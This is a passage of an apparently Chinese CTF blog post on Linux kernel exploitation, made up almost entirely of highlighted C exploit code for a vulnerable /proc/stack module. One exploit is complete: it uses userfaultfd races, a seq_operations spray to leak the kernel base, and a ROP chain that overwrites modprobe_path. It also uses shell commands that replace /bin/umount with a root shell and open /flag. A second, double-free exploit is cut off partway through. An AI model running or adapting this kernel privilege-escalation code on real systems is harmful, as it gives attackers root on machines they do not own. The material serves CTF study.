class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BZIMAGE_ADDR 0xFFFFFFFF81000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd_kstack = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* fault_addr;</span><br><span class="line"><span class="keyword">uint64_t</span> fd_seq[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> single_stop_off = <span class="number">0xFFFFFFFF8113BE80</span> - BZIMAGE_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path_addr = <span class="number">0xFFFFFFFF81C2C541</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> add_rsp_0x1f8_ret = <span class="number">0xffffffff814d51c0</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdx_rdi_ret = <span class="number">0xffffffff8122dd4b</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsi_ret = <span class="number">0xffffffff81047a8e</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> mov_qp_rdx_rdi_ret = <span class="number">0xffffffff8121216f</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> do_task_dead = <span class="number">0xFFFFFFFF8106EBB0</span> - BZIMAGE_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)page = add_rsp_0x1f8_ret;          <span class="comment">// control rip</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//注册缺页错误处理</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_push</span><span class="params">(<span class="keyword">uint64_t</span>* arg)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0001</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_pop</span><span class="params">(<span class="keyword">uint64_t</span>* arg)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57ac0002</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">push_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0001</span>,fault_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_seq_operations</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">        fd_seq[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">        close(fd_seq[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fd_seq,<span class="number">0</span>,<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare</span><span class="params">()</span></span>&#123; </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nrm /bin/umount\necho -e \&quot;#!/bin/sh\\n/bin/sh\\n\&quot; &gt; /bin/umount\nchmod 777 /bin/umount&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fork()) &#123;</span><br><span class="line">        sleep(<span class="number">10</span>);                          </span><br><span class="line">        system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;ls -l /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> ret_value = <span class="number">0</span>;</span><br><span class="line">    prepare();</span><br><span class="line"></span><br><span class="line">    fd_kstack = open(<span class="string">&quot;/proc/stack&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set userfaultfd</span></span><br><span class="line">    fault_addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr, userfaultfd_leak_handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak kernel_base</span></span><br><span class="line">    prepare_seq_operations();           <span class="comment">// spray kernel addr in heap-0x20</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr_push,thr_pop;</span><br><span class="line">    pthread_create(&amp;thr_push, <span class="literal">NULL</span>, push_thread, <span class="number">0</span>);        <span class="comment">// stop at copy_from_user</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    cmd_pop(&amp;ret_value);        <span class="comment">// kfree</span></span><br><span class="line">    kernel_base = ret_value - single_stop_off;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line">    add_rsp_0x1f8_ret += kernel_base;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// control rip</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="comment">// for(i = 0; i &lt; 50; i++)&#123;</span></span><br><span class="line">    <span class="comment">//     fd_seq[i] = open(&quot;/proc/self/stat&quot;,0);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    fd_seq[<span class="number">0</span>] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    temp_fd = fd_seq[<span class="number">0</span>];</span><br><span class="line">    modprobe_path_addr += kernel_base;</span><br><span class="line">    pop_rdx_rdi_ret += kernel_base;</span><br><span class="line">    pop_rsi_ret += kernel_base;</span><br><span class="line">    mov_qp_rdx_rdi_ret += kernel_base;</span><br><span class="line">    do_task_dead += kernel_base;</span><br><span class="line">    <span class="comment">// read(fd_seq[0],buf,0x20);</span></span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x15151515;&quot;</span>     <span class="comment">// r15</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x14141414;&quot;</span>      <span class="comment">// r14 /tmp/x</span></span><br><span class="line">        <span class="string">&quot;mov r13, pop_rdx_rdi_ret;&quot;</span>      <span class="comment">// r13</span></span><br><span class="line">        <span class="string">&quot;mov r12, modprobe_path_addr;&quot;</span>      <span class="comment">// r12</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, mov_qp_rdx_rdi_ret;&quot;</span>      <span class="comment">// r10</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0x782f706d742f;&quot;</span>      <span class="comment">// bbbbbbbb</span></span><br><span class="line">        <span class="string">&quot;mov rbx, pop_rsi_ret;&quot;</span>      <span class="comment">// aaaaaaaa</span></span><br><span class="line">        <span class="string">&quot;mov r9, do_task_dead;&quot;</span>       <span class="comment">// r9</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x88888888;&quot;</span>       <span class="comment">//r8</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, temp_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// for(i = 0; i &lt; 50; i++)&#123;</span></span><br><span class="line">    <span class="comment">//     read(fd_seq[i],buf,0x20);</span></span><br><span class="line">    <span class="comment">//     printf(&quot;[+]index : %d done!&quot;,i);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>效果如下：</p>
<p><img   src="image-20230228232415377.png?size=600" style="width: 600px;"  alt="image-20230228232415377"></p>

        <h3 id="exp2-1"   >
          <a href="#exp2-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp2-1" class="headerlink" title="exp2"></a>exp2</h3>
      <blockquote>
<p>通过double free 构造任意地址写，直接写modprobe_path</p>
</blockquote>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BZIMAGE_ADDR 0xFFFFFFFF81000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd_kstack = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* fault_addr;</span><br><span class="line"><span class="keyword">char</span>* fault_addr2;</span><br><span class="line"><span class="keyword">char</span>* fault_addr3;</span><br><span class="line"><span class="keyword">char</span>* fault_addr4;</span><br><span class="line"><span class="keyword">uint64_t</span> fd_seq[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> single_stop_off = <span class="number">0xFFFFFFFF8113BE80</span> - BZIMAGE_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path_addr = <span class="number">0xFFFFFFFF81C2C541</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdx_rdi_ret = <span class="number">0xffffffff8122dd4b</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsi_ret = <span class="number">0xffffffff81047a8e</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> mov_qp_rdx_rdi_ret = <span class="number">0xffffffff8121216f</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> do_task_dead = <span class="number">0xFFFFFFFF8106EBB0</span> - BZIMAGE_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_sleep3_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span 